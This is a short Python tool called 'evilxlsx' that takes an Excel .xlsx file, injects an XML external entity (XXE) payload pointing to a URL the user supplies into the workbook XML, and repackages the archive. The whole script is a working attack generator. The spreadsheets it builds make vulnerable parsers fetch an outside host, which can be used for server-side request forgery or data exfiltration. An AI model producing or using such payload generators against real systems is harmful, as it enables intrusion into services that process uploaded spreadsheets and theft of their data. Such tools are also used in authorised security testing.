#!/usr/bin/env python

import sys, zipfile, optparse, os, string, random, tempfile

def get_random_string(length):
    # choose from all lowercase letter
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

# https://stackoverflow.com/questions/25738523/how-to-update-one-file-inside-zip-file
def updateZip(zipname, filename, data):
    # generate a temp file
    tmpfd, tmpname = tempfile.mkstemp(dir=os.path.dirname(zipname))
    os.close(tmpfd)

    # create a temp copy of the archive without filename            
    with zipfile.ZipFile(zipname, 'r') as zin:
        with zipfile.ZipFile(tmpname, 'w') as zout:
            zout.comment = zin.comment # preserve the comment
            for item in zin.infolist():
                if item.filename != filename:
                    zout.writestr(item, zin.read(item.filename))

    # replace with the temp archive
    os.remove(zipname)
    os.rename(tmpname, zipname)

    # now add filename with its new data
    with zipfile.ZipFile(zipname, mode='a', compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(filename, data)

def main(argv=sys.argv):
	p = optparse.OptionParser(description = 'Create an Excel Sheet triggering XXE', 
								prog = 'evilxlsx',
								version = '0.1',
								usage = '%prog <input file> <target URL>')
	p.add_option('--target', '-t', dest="target", help="file to inject XXE payload into")
	p.set_default("target", "xl/workbook.xml")
	options, arguments = p.parse_args()
	fname = arguments[0]
	if len(arguments) == 1:
		with zipfile.ZipFile(fname, 'r') as zf:
			for line in zf.filelist:
				print(line.filename)
		exit()
	url = arguments[1]

	ext = os.path.splitext(fname)[1]
	if ext in {".xlsx"}:
		xxe_name = get_random_string(5)
		payload = f'<!DOCTYPE x [ <!ENTITY {xxe_name} SYSTEM "{url}"> ]>\n<x>&{xxe_name};</x>'
		wb_content = None
		with zipfile.ZipFile(fname, 'r') as zf:
			wb_content = zf.read(options.target)
		header, remainder = wb_content.split(b"?>", 1)
		wb_content = header + b"?>" + payload.encode("utf-8") + remainder
		print(wb_content)
		updateZip(fname, options.target, wb_content)



if __name__ == '__main__':
     main()
